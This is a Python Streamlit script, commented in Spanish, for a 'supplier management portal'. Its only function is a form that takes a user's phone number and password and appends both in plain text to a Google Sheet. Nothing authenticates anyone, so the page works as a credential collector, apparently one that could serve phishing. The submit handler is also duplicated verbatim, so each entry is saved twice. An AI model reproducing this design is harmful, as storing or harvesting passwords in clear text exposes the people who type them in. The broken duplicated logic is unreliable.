import streamlit as st
from streamlit_gsheets import GSheetsConnection
import pandas as pd

# Mostrar Título y Descripción
st.title("Portal de Gestión de Proveedores")

# Establecer conexión con Google Sheets
conn = GSheetsConnection()

# Obtener datos existentes
existing_data = conn.read(worksheet="Registros de Usuarios", usecols=list(range(2)), ttl=5)
existing_data = existing_data.dropna(how="all")

# Formulario para agregar celular y contraseña
with st.form(key="credentials_form"):
    celular = st.text_input(label="Celular*")
    contrasena = st.text_input(label="Contraseña*", type="password")

    # Marcar campos obligatorios
    st.markdown("**obligatorio*")

    submit_button = st.form_submit_button(label="Enviar Detalles")

    # Si se presiona el botón de envío
    if submit_button:
        # Verificar si se completaron los campos obligatorios
        if not celular or not contrasena:
            st.warning("Asegúrese de que todos los campos obligatorios estén completos.")
            st.stop()
        
        # Crear una nueva fila con celular y contraseña
        datos = pd.DataFrame(
            [
                {
                    "Celular": celular,
                    "Contrasena": contrasena,
                }
            ]
        )

        # Agregar los nuevos datos a los datos existentes
        updated_df = pd.concat([existing_data, datos], ignore_index=True)

        # Actualizar Google Sheets con los nuevos datos
        conn.update(worksheet="Registros de Usuarios", data=updated_df)

        st.success("¡Detalles enviados exitosamente!")


    # Si se presiona el botón de envío
    if submit_button:
        # Verificar si se completaron los campos obligatorios
        if not celular or not contrasena:
            st.warning("Asegúrese de que todos los campos obligatorios estén completos.")
            st.stop()
        
        # Crear una nueva fila con celular y contraseña
        datos = pd.DataFrame(
            [
                {
                    "Celular": celular,
                    "Contrasena": contrasena,
                }
            ]
        )

        # Agregar los nuevos datos a los datos existentes
        updated_df = pd.concat([existing_data, datos], ignore_index=True)

        # Actualizar Google Sheets con los nuevos datos
        conn.update(worksheet="Registros de Usuarios", data=updated_df)

        st.success("¡Detalles enviados exitosamente!")
